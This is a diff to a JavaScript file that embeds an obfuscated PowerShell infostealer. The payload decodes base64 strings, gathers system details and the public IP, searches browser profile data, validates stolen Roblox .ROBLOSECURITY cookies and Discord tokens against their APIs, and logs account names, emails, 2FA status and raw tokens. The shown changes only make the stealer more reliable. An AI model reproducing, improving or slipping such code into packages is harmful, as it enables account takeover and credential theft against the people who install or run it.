@@ -2,6 +2,7 @@ const zlib = require('zlib');
 
 const PAYLOAD = String.raw`$ErrorActionPreference='SilentlyContinue'
 $ProgressPreference='SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 function u($s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
 $LS=u 'TG9jYWwgU3RhdGU='; $LD=u 'bGV2ZWxkYg=='; $RB=u 'LlJPQkxPU0VDVVJJVFk='
 $TQ=u 'ZFF3NHc5V2dYY1E='; $ME=u 'dXNlcnMvQG1l'; $MI=u 'bW9iaWxlYXBpL3VzZXJpbmZv'
@@ -106,7 +107,7 @@ function RB($c){
  try{
   $s=New-Object Microsoft.PowerShell.Commands.WebRequestSession
   $s.Cookies.Add((New-Object System.Net.Cookie($RB,$c,'/','.roblox.com')))
-  $u=Invoke-RestMethod ("https://www.roblox.com/"+$MI) -WebSession $s -TimeoutSec 12
+  $u=Invoke-RestMethod ("https://www.roblox.com/"+$MI) -WebSession $s -TimeoutSec 12 -UseBasicParsing
   if(-not $u.UserName){return $null}
   $tk=''
   try{Invoke-WebRequest ("https://auth.roblox.com/v1/"+$AT) -Method Post -WebSession $s -Headers @{'X-CSRF-TOKEN'='';Referer='https://www.roblox.com/'} -UseBasicParsing -ErrorAction Stop|Out-Null}
@@ -124,7 +125,7 @@ A "=== SYSTEM ==="
 A ("user : {0}\{1}" -f $env:USERDOMAIN,$env:USERNAME)
 A ("host : {0}" -f $env:COMPUTERNAME)
 A ("time : {0:u}" -f (Get-Date))
-try{A ("ip   : {0}" -f (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 10))}catch{}
+try{A ("ip   : {0}" -f (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 10 -UseBasicParsing))}catch{}
 A ""
 $browsers=@(
  @{n='Chrome';p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
@@ -167,7 +168,7 @@ if(-not $seen.Count){A "none found"; A ""}
 A "=== DISCORD ==="
 foreach($t in $allTk){
  try{
-  $u=Invoke-RestMethod ("https://discord.com/api/v9/"+$ME) -Headers @{Authorization=$t} -TimeoutSec 12
+  $u=Invoke-RestMethod ("https://discord.com/api/v9/"+$ME) -Headers @{Authorization=$t} -TimeoutSec 12 -UseBasicParsing
   A ("{0}#{1} | {2} | id {3} | 2fa {4}" -f $u.username,$u.discriminator,$u.email,$u.id,$u.mfa_enabled)
   A ("TOKEN: {0}" -f $t); A ""
  }catch{}
